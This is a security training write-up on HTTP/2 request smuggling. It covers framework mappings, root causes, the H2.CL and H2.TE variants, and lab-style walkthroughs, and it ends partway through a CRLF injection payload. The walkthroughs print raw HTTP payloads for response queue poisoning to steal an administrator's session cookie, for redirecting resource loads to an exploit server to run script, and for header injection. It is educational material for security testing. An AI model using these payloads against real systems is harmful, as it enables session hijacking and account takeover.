# HTTP/2 Request Smuggling

**Category:** HTTP Request Smuggling (Request Desynchronization)
**Severity:** High or Critical

To ensure precise classification during reporting and threat modeling, map this weakness against the following industry frameworks:


* CWE-444 (Primary): Inconsistent Interpretation of HTTP Requests
('HTTP Request/Response Smuggling') — The frontend and backend components
interpret the boundaries or semantics of an HTTP request differently,
particularly when HTTP/2 requests are translated or downgraded to HTTP/1.1,
allowing an attacker to desynchronize request processing.

* CWE-436 (Related): Interpretation Conflict — A broader weakness describing
inconsistent interpretation of the same input by different components.
In HTTP/2 request smuggling, this commonly occurs between HTTP/2 frontend
processing and HTTP/1.1 backend processing during protocol translation.

* OWASP Top 10 Reference: A05:2021 – Security Misconfiguration — Commonly
associated with insecure or inconsistent HTTP/2-to-HTTP/1.1 protocol
translation, proxy configuration, and request parsing. Depending on the
underlying design and impact, it may also relate to A04:2021 – Insecure
Design.


## Definition

***HTTP/2 Request Smuggling*** is an exploitation technique that targets applications where HTTP/2 requests are processed by a front-end server and subsequently translated or downgraded to HTTP/1.1 before reaching a back-end server.

The vulnerability occurs when the frontend and backend interpret the translated request differently, particularly when HTTP/2-specific request semantics interact with HTTP/1.1 mechanisms such as `Content-Length` or `Transfer-Encoding`. This parsing discrepancy can allow an attacker to inject additional requests, desynchronize the connection, poison request or response queues, or interfere with requests belonging to other users.

## Root Cause

HTTP/2 Request Smuggling occurs when a frontend HTTP/2 server and a backend HTTP/1.1 server have inconsistent assumptions about request boundaries during protocol conversion.

HTTP/2 normally uses its binary framing layer to determine request boundaries and does not require the HTTP/1.1 `Transfer-Encoding: chunked` mechanism. However, when an HTTP/2 frontend downgrades requests to HTTP/1.1, unsafe handling of headers or ambiguous request-length information can introduce a parsing discrepancy.

Common causes include:

* Unsafe HTTP/2-to-HTTP/1.1 downgrading.
* Incorrect handling of `Content-Length`.
* Acceptance or forwarding of `Transfer-Encoding` in HTTP/2 requests.
* Differences in request parsing between the frontend and backend.
* Improper normalization of HTTP/2 headers during protocol translation.
* Reuse of poisoned backend connections.

These inconsistencies can result in **H2.CL**, **H2.TE**, or other HTTP/2 request-smuggling variants.

## Classification of HTTP/2 Request Smuggling Vulnerabilities

HTTP/2 request smuggling variations are classified according to how the HTTP/2 frontend translates request-length information when communicating with an HTTP/1.1 backend.

### 1. H2.CL (HTTP/2 / Content-Length)

* **The Architecture:** The frontend accepts an HTTP/2 request containing a `Content-Length` value and downgrades it to HTTP/1.1. The backend interprets the resulting request according to HTTP/1.1 request-length rules.

* **The Mechanism:** An attacker manipulates the declared HTTP/2 request length so that the frontend and backend disagree about where the request ends. When the request is downgraded, the mismatch can cause additional bytes to be interpreted as a separate HTTP/1.1 request.

### 2. H2.TE (HTTP/2 / Transfer-Encoding)

* **The Architecture:** The frontend accepts an HTTP/2 request containing an ambiguous or improperly handled `Transfer-Encoding` header and downgrades the request to HTTP/1.1, where the backend supports chunked encoding.

* **The Mechanism:** The attacker abuses the HTTP/2-to-HTTP/1.1 translation to introduce chunked encoding semantics into the backend connection. The frontend and backend consequently disagree about request boundaries, allowing a smuggled HTTP/1.1 request to be injected.

* **Common Impact:** Depending on the backend architecture, H2.TE can be used for request desynchronization, request/response queue poisoning, cross-user response capture, authentication bypass, and other attacks.

## Key Difference from HTTP/1.1 Request Smuggling

The primary distinction is the **protocol boundary** being exploited.

* **HTTP/1.1 HRS:** The frontend and backend disagree about HTTP/1.1 message boundaries, commonly involving `Content-Length` and `Transfer-Encoding`.
* **HTTP/2 HRS:** The attack commonly exploits inconsistencies introduced when an HTTP/2 frontend translates or downgrades requests into HTTP/1.1 for a backend server.

Therefore, HTTP/2 Request Smuggling should be considered a **protocol translation and request parsing problem**, rather than simply another form of CL.TE or TE.CL.

### a. Response Queue Poisoning via H2.TE Request Smuggling

* **The Objective:** Exploit an **H2.TE request smuggling** vulnerability to poison the backend response queue, capture an administrator's authenticated response, obtain their session cookie, access `/admin`, and delete the user **carlos**.

* **The Mechanism:** The frontend accepts an HTTP/2 request containing `Transfer-Encoding: chunked` and downgrades it to HTTP/1.1. The `0` chunk terminates the frontend's interpretation of the request, while the remaining bytes are treated by the backend as a smuggled HTTP/1.1 request. This desynchronizes the backend request/response sequence and allows the attacker to receive responses belonging to other users.

* **Core Layout Structure (Desynchronization Test):**

```http
POST / HTTP/2
Host: target.com
Transfer-Encoding: chunked

0

SMUGGLED
```

* **The Response Queue Poisoning:** After confirming the desynchronization, the attacker smuggles a complete HTTP/1.1 request to a nonexistent endpoint so that the expected response is consistently `404`. This makes responses belonging to other users easier to identify.

```http
POST /x HTTP/2
Host: target.com
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: target.com

```

The smuggled request must be terminated with `\r\n\r\n` after the `Host` header.

* **The Session Capture:** The poisoned response queue is repeatedly queried until a response intended for the administrator is captured. The administrator periodically logs in, generating a `302` response containing their new authenticated session cookie. The attacker extracts this cookie and uses it to impersonate the administrator.

```http
GET /admin HTTP/2
Host: target.com
Cookie: session=STOLEN-SESSION-COOKIE
```

* **The Administrative Action:** Once the administrator's session is obtained, the attacker accesses `/admin` and identifies the delete endpoint `/admin/delete?username=carlos`. Replacing the request path with this endpoint while retaining the stolen session cookie allows the attacker to delete **carlos**.

* **The Security Impact:** H2.TE response queue poisoning can cause cross-user response capture and session theft. A successful attack can lead to authentication bypass, account takeover, and unauthorized administrative actions.

### b. H2.CL Request Smuggling

* **The Objective:** Exploit an **H2.CL request smuggling** vulnerability to poison the backend connection and cause the victim's browser to load and execute an attacker-controlled JavaScript file containing `alert(document.cookie)`.

* **The Mechanism:** The frontend accepts an HTTP/2 request with `Content-Length: 0` and downgrades it to HTTP/1.1. The frontend considers the request body empty, while the backend continues processing the remaining bytes as a smuggled HTTP/1.1 request. By smuggling a `/resources` request with an attacker-controlled `Host` header, the attacker redirects the victim's resource request to the exploit server.

* **Core Layout Structure:**

```http id="j7xq2m"
POST / HTTP/2
Host: target.com
Content-Length: 0

GET /resources HTTP/1.1
Host: YOUR-EXPLOIT-SERVER
Content-Length: 5

x=1
```

* **The XSS Delivery:** The attacker hosts a malicious JavaScript payload at `/resources` on the exploit server. By repeatedly poisoning the connection and timing the attack with the victim's request, the victim is redirected to the malicious resource, causing `alert(document.cookie)` to execute.

* **The Security Impact:** H2.CL request smuggling can be combined with open-redirect behavior to deliver attacker-controlled JavaScript to other users, potentially resulting in cookie theft, session compromise, and account takeover.

### c. HTTP/2 Request Smuggling via CRLF Injection

* **The Objective:** Exploit an **HTTP/2-exclusive CRLF injection** vector to smuggle a request, capture another user's request containing their session cookie, and use the stolen cookie to access their account.

* **The Mechanism:** The front-end downgrades HTTP/2 requests to HTTP/1.1 but fails to properly sanitize CRLF characters in HTTP/2 headers. By injecting `\r\n` followed by `Transfer-Encoding: chunked`, the attacker introduces a new HTTP/1.1 header during the downgrade and creates a request smuggling condition.

* **Core Layout Structure:**
```http
POST / HTTP/2
Host: target.com
foo: bar\r\n Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: target.com
Cookie: session=YOUR-SESSION-COOKIE
Content-Length: 800

search=x
